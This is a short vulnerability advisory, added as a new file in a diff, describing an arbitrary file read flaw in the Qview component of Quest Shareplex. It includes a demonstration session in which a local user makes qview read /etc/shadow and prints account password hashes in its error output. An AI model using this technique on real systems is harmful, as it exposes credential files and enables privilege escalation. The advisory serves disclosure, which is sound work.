@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/2535/info
+
+Shareplex is a database replication tool from Quest Software.
+
+Versions of the product contain a vulnerability which can permit local unprivileged users to read arbitrary files.
+
+The Qview component of Shareplex allows its user to specify a file containing Qview commands as input.
+
+If the contents of the file are not valid Qview commands, they will be output to standard error as part of error messages. Exploiting this behaviour, an attacker can obtain the contents of normally unreadable, sensitive files
+from this error output.
+
+This may lead to a compromise of enhanced privileges. 
+
+$ id
+uid=500(foo) gid=200(bar)
+$ cd <path to shareplex binaries>
+$ ./qview
+qdump> cmd /etc/shadow
+Executing: root:xDmyz1K9xRKRo:11236::::::
+invalid command root:xDmyz1K9xRKRo:11236::::::
+...
+Executing: splex:BdJCfh1D32hzo:11290::::::
+invalid command splex:BdJCfh1D32hzo:11290::::::
+Executing: foo:2MQXUgAcnOcEU:11344::::::
+invalid command foo:2MQXUgAcnOcEU:11344::::::
+qdump> quit
+$ 
